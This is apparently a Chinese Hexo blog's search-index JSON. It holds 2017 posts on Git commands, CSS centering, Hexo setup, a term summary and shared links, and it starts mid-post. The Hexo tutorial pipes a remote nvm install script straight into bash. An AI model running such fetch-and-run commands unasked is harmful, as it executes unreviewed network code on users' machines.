active的active为自定义的类名，点击链接时就会额外加入自己自定义的class了。","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"}],"author":"给你灵感奶昔"},{"title":"好货分享（一）","slug":"好货分享（一）","date":"2017-07-16T03:11:11.000Z","updated":"2023-11-17T14:27:30.009Z","comments":true,"path":"2017/07/16/好货分享（一）/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/16/%E5%A5%BD%E8%B4%A7%E5%88%86%E4%BA%AB%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"科学上网 1https://laod.cn/hosts/2017-google-hosts.html ps: 支持windows &amp; mac , linux &amp; android","text":"科学上网 1https://laod.cn/hosts/2017-google-hosts.html ps: 支持windows &amp; mac , linux &amp; android 自己制作loading的gif图片 ps：可选gif,png,svg 1https://preloaders.net/ 白色调二维码生成器 1https://spacekid.me/halftone-qr-code-generator/ Tampermonkey（谷歌插件），可解析百度网盘链接 1https://tampermonkey.net/index.php?version=4.3.6&amp;ext=dhdg&amp;show=gcal","categories":[],"tags":[],"author":"给你灵感奶昔"},{"title":"2017学年个人总结","slug":"2017学年个人总结","date":"2017-07-12T16:07:00.000Z","updated":"2023-11-17T14:27:30.000Z","comments":true,"path":"2017/07/13/2017学年个人总结/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/13/2017%E5%AD%A6%E5%B9%B4%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/","excerpt":"伴随最后一个月的泡图书馆复习，考完试，这个学期就这样结束了。 这学期能从课本收获到的专业知识最多的就数计算机网络原理、数据库了。更多的还是自学，大学的主要学习还得靠自学，虽然这学期上课经常神游到工作上的事情，然后意识过来的时候老师已经上到下一章节了，但是在最后一个月的抢救中还是补回来了。","text":"伴随最后一个月的泡图书馆复习，考完试，这个学期就这样结束了。 这学期能从课本收获到的专业知识最多的就数计算机网络原理、数据库了。更多的还是自学，大学的主要学习还得靠自学，虽然这学期上课经常神游到工作上的事情，然后意识过来的时候老师已经上到下一章节了，但是在最后一个月的抢救中还是补回来了。 让我大学生活丰富起来的，归属于课外的兴趣的学习（全栈开发）。兴趣还是得有的，不希望回过头来回忆大学生活的时候，就只剩下和老友开黑了（已经很久没接触游戏了，有时间只是看一些精彩集锦R闪回旋踢）。因为课外学习的东西，让我在做课设时几天就可以交作品检查了。 上半年学了git，bootstrap，sass，会用jqurey实现常用交互效果。 下半年开始了解真正的前端。今年前端多了很多东西，自从Node的出现。然后学习热情异常的高涨，了解了什么是单页面程序，webpack，vue，ES6，npm。 加上最近几个月接触的python框架Django，开始真正参与项目的制作，逐渐地积累项目经验。 一个月前搭建了自己的博客，域名还在备案中（备了好久了，最后管局审核还需要20个工作日 - -） 又到暑假了，规划两个月的学习及未来计划。 主站改版10.2.1.20170711（版号） 规划培训工作。 ES5、ES6的原生学习 微信小程序的开发。 兴趣的培养，是自从加入校园组织开始的。一切都是缘分的开始，让我在这条路不断前进。今年，第二年。 初入大学时的我，羞涩、懵懂。高中都处在学习之中再学习的状态，没加过社团或学生会之类的，就特别希望大学能加入社团，特别特别的希望，就是那种收到恭喜您通过面试的短信然后跳起来转三圈yes的那种。 舍友都陆陆续续的去找社团面试了，我还在宿舍躺着，不知道该选什么好。晚上学长学姐扫楼的时候，发了几张招新表到我们宿舍，填上表去参加面试的那一刻，整个大学的故事就开始了。 今年，第二年，我当上了副站长。 感谢大佬们和小伙伴们的支持，睡觉都是爱你们的形状。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.zhengxiangling.com/tags/%E9%9A%8F%E7%AC%94/"}],"author":"给你灵感奶昔"},{"title":"css居中","slug":"css常用居中","date":"2017-07-08T02:34:00.000Z","updated":"2023-11-17T14:27:30.004Z","comments":true,"path":"2017/07/08/css常用居中/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/08/css%E5%B8%B8%E7%94%A8%E5%B1%85%E4%B8%AD/","excerpt":"css的居中方式有很多种 文本居中 text-align margin居中 0 auto 定位属性居中 这里说的是margin来居中，建议减少定位position的使用。","text":"css的居中方式有很多种 文本居中 text-align margin居中 0 auto 定位属性居中 这里说的是margin来居中，建议减少定位position的使用。 会用到的css属性 12345# 最小宽度min-width: 1200px;# 最大宽度max-width: 1920px; 效果图 banner及footer属性 123width: 100%;min-width: 1200px;max-width: 1920px; 公用容器类container： 1234.container &#123; width: 1000px; margin: 0 auto;&#125; 源码（放在github，自行clone下来） git 地址 https://github.com/zzzzzzxl/css_","categories":[],"tags":[{"name":"css","slug":"css","permalink":"https://blog.zhengxiangling.com/tags/css/"}],"author":"给你灵感奶昔"},{"title":"Git入门","slug":"Git入门","date":"2017-07-07T02:36:00.000Z","updated":"2023-11-17T14:27:30.002Z","comments":true,"path":"2017/07/07/Git入门/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/07/Git%E5%85%A5%E9%97%A8/","excerpt":"一、git实现简单的文件上传 （这里会用到coding）-&gt; 创建自己的项目 基础选项 项目名称 – 建议用全英文 属性 – 公开 初始化仓库 启用README.md文件初始化项目","text":"一、git实现简单的文件上传 （这里会用到coding）-&gt; 创建自己的项目 基础选项 项目名称 – 建议用全英文 属性 – 公开 初始化仓库 启用README.md文件初始化项目 clone到本地仓库选择要clone到的文件夹，比如我要clone到桌面，我的桌面名字为Desktop 1234$ cd Desktop$ git clone 你刚才复制的地址# clone完成之后进入clone下来的文件夹里$ cd [your_dir] 在clone下来的文件夹里新建文件 然后进入clone好的文件夹里新建一个自定义文件，比如新建一个666.txt 查看此时本地仓库的状态12# 使用 git status 命令$ git status 将修改文件添加到暂缓区（index）12# 使用 git add 命令$ git add 666.txt 确认无误后添加到本地仓库（repository）12# 使用 git commit 命令 （-m 表示提交的信息）$ git commit -m &#x27;my_message&#x27; (注意 -m 前后面都有一个空格) 附：(没有则跳过)如果提示出现please tell me who you are，按照求输入就行了. 1git config --global user.email &#x27;填写你的邮箱&#x27; 1git config --global user.name &#x27;你的名字&#x27; 本地修改完成后提交到远程仓库（remote）12# 使用 git push 命令$ git push 二、修改工作区文件，传到远程仓库 修改666.txt的内容,添加信息 hello world 添加到暂缓区$ git add 666.txt 添加到本地仓库$ git commit -m &#39;我添加了一些信息&#39; 上传到远程仓库$ git push 然后就可以看到上传的文件和备注的一些信息了。 分享廖雪峰的官方网站-Git教程http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000 如有疑惑，欢迎留言提出~","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[{"name":"git","slug":"git","permalink":"https://blog.zhengxiangling.com/tags/git/"}],"author":"给你灵感奶昔"},{"title":"Git之常用代码","slug":"Git初探","date":"2017-07-06T23:18:00.000Z","updated":"2023-11-17T14:27:30.002Z","comments":true,"path":"2017/07/07/Git初探/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/07/Git%E5%88%9D%E6%8E%A2/","excerpt":"Git是一个分布式版本管理系统，是为了更好地管理Linux内核开发而创立的。 Git可以在任何时间点，把文档的状态作为更新记录保存起来。因此可以把编辑过的文档复原到以前的状态，也可以显示编辑前后的内容差异。 而且，编辑旧文件后，试图覆盖较新的文件的时候（即上传文件到服务器时），系统会发出警告，因此可以避免在无意中覆盖了他人的编辑内容。","text":"Git是一个分布式版本管理系统，是为了更好地管理Linux内核开发而创立的。 Git可以在任何时间点，把文档的状态作为更新记录保存起来。因此可以把编辑过的文档复原到以前的状态，也可以显示编辑前后的内容差异。 而且，编辑旧文件后，试图覆盖较新的文件的时候（即上传文件到服务器时），系统会发出警告，因此可以避免在无意中覆盖了他人的编辑内容。 个人最常用的几个git指令：1234567891011121314151617181920212223242526# 在当前目录新建一个Git代码库$ git init# 下载一个项目和它的整个代码历史$ git clone [url]#添加指定文件或文件夹到暂存区$ git add [file]/ [dir]# 提交暂存区到仓库区$ git commit -m [message] # 显示有变更的文件$ git status # 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]#上传本地指定分支到远程仓库$ git push [remote] [branch]# 恢复暂存区的指定文件到工作区$ git checkout [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard 高频git命令清单 —— 转载自 阮一峰的常用 Git 命令清单 几个专用名词的译名如下。 Workspace：工作区Index &#x2F; Stage：暂存区Repository：仓库区（或本地仓库）Remote：远程仓库 新建代码库12345678# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] 配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot; 增加&#x2F;删除文件123456789101112131415161718192021# 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file]# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed] 代码提交123456789101112131415161718# 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ... 分支123456789101112131415161718192021222324252627282930313233343536373839404142# 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 标签1234567891011121314151617181920212223242526# 列出所有tag$ git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] 查看信息12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog### 远程同步# 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all 撤销12345678910111213141516171819202122232425262728293031# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop 其他12# 生成一个可供发布的压缩包$ git archive","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[],"author":"给你灵感奶昔"},{"title":"markdown语法入门指南（待续）","slug":"markdown语法入门指南","date":"2017-06-29T14:41:00.000Z","updated":"2023-11-17T14:27:30.006Z","comments":true,"path":"2017/06/29/markdown语法入门指南/","link":"","permalink":"https://blog.zhengxiangling.com/2017/06/29/markdown%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/","excerpt":"灵感来源 – Markdown 语法说明 (简体中文版) 未完，待续","text":"灵感来源 – Markdown 语法说明 (简体中文版) 未完，待续","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[],"author":"给你灵感奶昔"},{"title":"hexo博客搭建","slug":"hexo博客搭建","date":"2017-06-26T13:56:00.000Z","updated":"2023-11-17T14:27:30.005Z","comments":true,"path":"2017/06/26/hexo博客搭建/","link":"","permalink":"https://blog.zhengxiangling.com/2017/06/26/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"一、技术栈 Markdown Hexo git 二、工具 图床 – 极简图床 三、开始搞事情 注：此教程使用的命令基于 Linux, 在Window系统上的安装方式会稍有不同。","text":"一、技术栈 Markdown Hexo git 二、工具 图床 – 极简图床 三、开始搞事情 注：此教程使用的命令基于 Linux, 在Window系统上的安装方式会稍有不同。 1.Hexo是什么？简单地说，Hexo是一个轻量级的Node.js博客框架，反正我们搭建博客的框架就是他了。 2.install git 123sudo apt-get install git-core// 测试安装成功，输出版本号即安装成功git version 3.install node 12345678910curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.6/install.sh | bashexport NVM_DIR=&quot;$HOME/.nvm&quot;[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; . &quot;$NVM_DIR/nvm.sh&quot; # This loads nvmcommand -v nvmnvm install stable// 测试安装成功，输出版本号即安装成功node --version 4.国内的npm速度受限，可以使用淘宝镜像加速。 123sudo npm install cnpm -g --registry=https://registry.npm.taobao.org// 测试安装成功，输出版本号即安装成功cnpm version 5.install hexo 123sudo cnpm install -g hexo-cli// 测试安装成功，输出版本号即安装成功hexo version 6.注册 极简图床 和 Coding 账号 7.开始搭建 1234567// 新建用于存放博客的文件夹mkdir hexo-startcd hexo-start// 初始化hexohexo initcnpm install 目录结构 12345678.├── _config.yml ├── package.json ├── scaffolds ├── source | ├── _drafts | └── _posts └── themes 8.run起来 12hexo ghexo server 然后访问http://localhost:4000/，访问成功说明成功了第一步了。 9.使用hexo-admin可视化编写博客 1)install 12cnpm install --save bcrypt-nodejscnpm install --save hexo-admin 2)创建admin的密码 12345node&gt; const bcrypt = require(&#x27;bcrypt-nodejs&#x27;)// undefined&gt; bcrypt.hashSync(&#x27;your_ password&#x27;)//&#x27;$2a$10$cHnT1Ri... 这是密码的哈希映射值&#x27; 3）编辑_config.yml，配置用户名和密码，加入 1234admin: username: user_name password_hash: 填入前面生成的密码的哈希值 secret: a secret something (用于产生cookie值的，可以不用变) 重新 123hexo cleanhexo ghexo server 此三句命令是重复的，我们加到.sh文件然后每次用bash命令执行即可。 新建restart.sh文件 123hexo cleanhexo ghexo server 然后每次执行 1bash restart.sh 即可 然后访问http://localhost:4000/admin，出现下图说明admin安装成功 10.实现RRS订阅功能 1cnpm install hexo-generator-feed --save 然后配置_config.yml 1234567# feedfeed: type: atom path: atom.xml limit: 20 hub: content 1bash restart.sh 即http://localhost:4000/atom.xml 11.更换主题 https://hexo.io/themes/ 其他主题自选，这里使用NexT主题作为演示 1)install 1git clone https://github.com/theme-next/hexo-theme-next.git 2)启用主题修改_config.yml 12// theme: landscapetheme: next 然后 1bash restart.sh 重新访问，主题更换了说明更换主题成功。 NexT主题更多配置（修改样式及第三方服务）自行查看文档。http://theme-next.iissnan.com/getting-started.html 12.将静态页面部署到 coding 上1)install hexo-deployer-git 插件 1cnpm install hexo-deployer-git --save 2)coding新建项目，hexo-start 3)然后修改_config.yml 修改 root，将root改为coding上面的项目名称 123456# URL...root: /hexo-start/...permalink: :year/:month/:day/:title/permalink_defaults: 修改远程coding的地址repo要填的仓库地址如图所示的位置，点击复制即可 12345deploy: type: git repo: 仓库地址 branch: master message: blog update 4)修改完之后，部署到 coding 上 1hexo deploy 5)开启 Pages 服务 点击 Pages服务，部署来源选择 master 分支，点击 保存。显示 Coding Pages 已经运行在 http:&#x2F;&#x2F;… ,说明已经成功将博客部署在 coding 上了。 代码地址 https://github.com/ElijahZheng/hexo-start","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[],"author":"给你灵感奶昔"}],"categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"双指针","slug":"计算机算法/双指针","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/"},{"name":"并查集","slug":"计算机算法/并查集","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"树状数组","slug":"计算机算法/树状数组","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"name":"最短路径","slug":"计算机算法/最短路径","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"},{"name":"差分数组","slug":"计算机算法/差分数组","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"},{"name":"二分查找","slug":"计算机算法/二分查找","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"name":"模拟","slug":"计算机算法/模拟","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A8%A1%E6%8B%9F/"},{"name":"回溯算法","slug":"计算机算法/回溯算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://blog.zhengxiangling.com/categories/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"链表","slug":"计算机算法/链表","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"},{"name":"堆","slug":"计算机算法/链表/堆","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/%E5%A0%86/"},{"name":"分享","slug":"分享","permalink":"https://blog.zhengxiangling.com/categories/%E5%88%86%E4%BA%AB/"},{"name":"滑动窗口","slug":"计算机算法/滑动窗口","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"},{"name":"服务器","slug":"服务器","permalink":"https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"爬坑","slug":"服务器/爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/%E7%88%AC%E5%9D%91/"},{"name":"CTF","slug":"CTF","permalink":"https://blog.zhengxiangling.com/categories/CTF/"},{"name":"Vue","slug":"Vue","permalink":"https://blog.zhengxiangling.com/categories/Vue/"},{"name":"java","slug":"java","permalink":"https://blog.zhengxiangling.com/categories/java/"},{"name":"爬虫","slug":"爬虫","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E8%99%AB/"},{"name":"区块链","slug":"区块链","permalink":"https://blog.zhengxiangling.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"系统","slug":"系统","permalink":"https://blog.zhengxiangling.com/categories/%E7%B3%BB%E7%BB%9F/"},{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"},{"name":"CSS","slug":"CSS","permalink":"https://blog.zhengxiangling.com/categories/CSS/"}],"tags":[{"name":"回溯算法","slug":"回溯算法","permalink":"https://blog.zhengxiangling.com/tags/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"},{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"},{"name":"快慢指针","slug":"快慢指针","permalink":"https://blog.zhengxiangling.com/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"},{"name":"二叉堆","slug":"二叉堆","permalink":"https://blog.zhengxiangling.com/tags/%E4%BA%8C%E5%8F%89%E5%A0%86/"},{"name":"单链表","slug":"单链表","permalink":"https://blog.zhengxiangling.com/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/"},{"name":"redis","slug":"redis","permalink":"https://blog.zhengxiangling.com/tags/redis/"},{"name":"java","slug":"java","permalink":"https://blog.zhengxiangling.com/tags/java/"},{"name":"springboot","slug":"springboot","permalink":"https://blog.zhengxiangling.com/tags/springboot/"},{"name":"vue-router","slug":"vue-router","permalink":"https://blog.zhengxiangling.com/tags/vue-router/"},{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"},{"name":"beautifulSoup","slug":"beautifulSoup","permalink":"https://blog.zhengxiangling.com/tags/beautifulSoup/"},{"name":"python","slug":"python","permalink":"https://blog.zhengxiangling.com/tags/python/"},{"name":"技术应用","slug":"技术应用","permalink":"https://blog.zhengxiangling.com/tags/%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8/"},{"name":"macOS","slug":"macOS","permalink":"https://blog.zhengxiangling.com/tags/macOS/"},{"name":"小程序","slug":"小程序","permalink":"https://blog.zhengxiangling.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"webpack","slug":"webpack","permalink":"https://blog.zhengxiangling.com/tags/webpack/"},{"name":"tornado","slug":"tornado","permalink":"https://blog.zhengxiangling.com/tags/tornado/"},{"name":"ssl","slug":"ssl","permalink":"https://blog.zhengxiangling.com/tags/ssl/"},{"name":"mongo","slug":"mongo","permalink":"https://blog.zhengxiangling.com/tags/mongo/"},{"name":"django","slug":"django","permalink":"https://blog.zhengxiangling.com/tags/django/"},{"name":"pillow","slug":"pillow","permalink":"https://blog.zhengxiangling.com/tags/pillow/"},{"name":"vuex","slug":"vuex","permalink":"https://blog.zhengxiangling.com/tags/vuex/"},{"name":"Mongo DB","slug":"Mongo-DB","permalink":"https://blog.zhengxiangling.com/tags/Mongo-DB/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.zhengxiangling.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"PayPal","slug":"PayPal","permalink":"https://blog.zhengxiangling.com/tags/PayPal/"},{"name":"支付","slug":"支付","permalink":"https://blog.zhengxiangling.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"node","slug":"node","permalink":"https://blog.zhengxiangling.com/tags/node/"},{"name":"express","slug":"express","permalink":"https://blog.zhengxiangling.com/tags/express/"},{"name":"three","slug":"three","permalink":"https://blog.zhengxiangling.com/tags/three/"},{"name":"图形学","slug":"图形学","permalink":"https://blog.zhengxiangling.com/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"电子邮件","slug":"电子邮件","permalink":"https://blog.zhengxiangling.com/tags/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/"},{"name":"Java","slug":"Java","permalink":"https://blog.zhengxiangling.com/tags/Java/"},{"name":"IMAP","slug":"IMAP","permalink":"https://blog.zhengxiangling.com/tags/IMAP/"},{"name":"POP3","slug":"POP3","permalink":"https://blog.zhengxiangling.com/tags/POP3/"},{"name":"SMTP","slug":"SMTP","permalink":"https://blog.zhengxiangling.com/tags/SMTP/"},{"name":"JAVA","slug":"JAVA","permalink":"https://blog.zhengxiangling.com/tags/JAVA/"},{"name":"服务器","slug":"服务器","permalink":"https://blog.zhengxiangling.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"uWSGI","slug":"uWSGI","permalink":"https://blog.zhengxiangling.com/tags/uWSGI/"},{"name":"nginx","slug":"nginx","permalink":"https://blog.zhengxiangling.com/tags/nginx/"},{"name":"Django","slug":"Django","permalink":"https://blog.zhengxiangling.com/tags/Django/"},{"name":"性能","slug":"性能","permalink":"https://blog.zhengxiangling.com/tags/%E6%80%A7%E8%83%BD/"},{"name":"Vue","slug":"Vue","permalink":"https://blog.zhengxiangling.com/tags/Vue/"},{"name":"fastclick","slug":"fastclick","permalink":"https://blog.zhengxiangling.com/tags/fastclick/"},{"name":"lazyload","slug":"lazyload","permalink":"https://blog.zhengxiangling.com/tags/lazyload/"},{"name":"ssh","slug":"ssh","permalink":"https://blog.zhengxiangling.com/tags/ssh/"},{"name":"linux","slug":"linux","permalink":"https://blog.zhengxiangling.com/tags/linux/"},{"name":"https","slug":"https","permalink":"https://blog.zhengxiangling.com/tags/https/"},{"name":"CSS布局","slug":"CSS布局","permalink":"https://blog.zhengxiangling.com/tags/CSS%E5%B8%83%E5%B1%80/"},{"name":"scss","slug":"scss","permalink":"https://blog.zhengxiangling.com/tags/scss/"},{"name":"随笔","slug":"随笔","permalink":"https://blog.zhengxiangling.com/tags/%E9%9A%8F%E7%AC%94/"},{"name":"css","slug":"css","permalink":"https://blog.zhengxiangling.com/tags/css/"},{"name":"git","slug":"git","permalink":"https://blog.zhengxiangling.com/tags/git/"}]}